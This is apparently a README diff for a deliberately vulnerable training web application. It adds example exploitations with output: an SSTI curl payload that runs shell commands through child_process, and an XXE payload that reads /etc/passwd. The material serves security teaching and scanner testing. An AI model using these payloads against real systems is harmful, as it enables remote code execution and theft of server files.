@@ -116,6 +116,26 @@ Full configuration & usage examples can be found in our [demo project](https://g
 - **Secret Tokens** - The index.html file includes a link to manifest URL, which returns the server's configuration, including a Google API key.
 
 - **Server-Side Template Injection (SSTI)** - The endpoint /api/render receives a plain text body and renders it using the doT (http://github.com/olado/dot) templating engine.
+  <details>
+    <summary>Server-Side Template Injection (SSTI) Example Exploitation</summary>
+
+  To demonstrate an SSTI attack, you can use the following `curl` command:
+
+  ```bash
+  curl 'https://brokencrystals.com/api/render' -X POST -H 'Content-Type: text/plain' \
+  --data-raw "{{= global.process.mainModule.require('child_process').execSync('ls -la /home') }}"
+  ```
+
+  The response includes a result of code execution - lising /home dir
+
+  ```
+  total 0
+  drwxr-xr-x    1 root     root            18 Feb 20 15:27 .
+  drwxr-xr-x    1 root     root            40 Mar 21 11:57 ..
+  drwxr-sr-x    2 node     node             6 Feb 20 15:27 node
+  ```
+
+  </details>
 
 - **Server-Side Request Forgery (SSRF)** - The endpoint /api/file receives the _path_ and _type_ query parameters and returns the content of the file in _path_ with Content-Type value from the _type_ parameter. The endpoint supports relative and absolute file names, HTTP/S requests, as well as metadata URLs of Azure, Google Cloud, AWS, and DigitalOcean.
   There are specific endpoints for each cloud provider as well - `/api/file/google`, `/api/file/aws`, `/api/file/azure`, `/api/file/digital_ocean`.
@@ -127,7 +147,47 @@ Full configuration & usage examples can be found in our [demo project](https://g
 - **Version Control System** - The client_s build process copies SVN, GIT, and Mercurial source control directories to the client application root, and they are accessible under Nginx root.
 
 - **XML External Entity (XXE)** - The endpoint, POST /api/metadata, receives URL-encoded XML data in the _xml_ query parameter, processes it with enabled external entities (using `libxmljs` library) and returns the serialized DOM. Additionally, for a request that tries to load file:///etc/passwd as an entity, the endpoint returns a mocked up content of the file.
+  <details>
+    <summary>XXE Example Exploitation</summary>
+
   Additionally, the endpoint PUT /api/users/one/{email}/photo accepts SVG images, which are processed with libxml library and stored on the server, as well as sent back to the client.
+
+  To demonstrate an XXE attack, you can use the following `curl` command:
+
+  ```bash
+  curl 'https://brokencrystals.com/api/metadata' -X POST -H 'Content-Type: text/xml' \
+   --data-raw '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY nexploit_xxe SYSTEM "file://etc/passwd">]> <root> &nexploit_xxe; </root>'
+  ```
+
+  The response containse servers file://etc/passwd content
+
+  ```
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE replace [
+    <!ENTITY nexploit_xxe SYSTEM "file://etc/passwd">
+    ]>
+    <root>  root:x:0:0:root:/root:/bin/sh
+            bin:x:1:1:bin:/bin:/sbin/nologin
+            daemon:x:2:2:daemon:/sbin:/sbin/nologin
+            lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+            sync:x:5:0:sync:/sbin:/bin/sync
+            shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+            halt:x:7:0:halt:/sbin:/sbin/halt
+            mail:x:8:12:mail:/var/mail:/sbin/nologin
+            news:x:9:13:news:/usr/lib/news:/sbin/nologin
+            uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+            cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+            ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+            sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+            games:x:35:35:games:/usr/games:/sbin/nologin
+            ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+            guest:x:405:100:guest:/dev/null:/sbin/nologin
+            nobody:x:65534:65534:nobody:/:/sbin/nologin
+            node:x:1000:1000::/home/node:/bin/sh
+    </root>
+  ```
+
+  </details>
 
 - **JavaScript Vulnerabilities Scanning** - Index.html includes an older version of the jQuery library with known vulnerabilities.
 
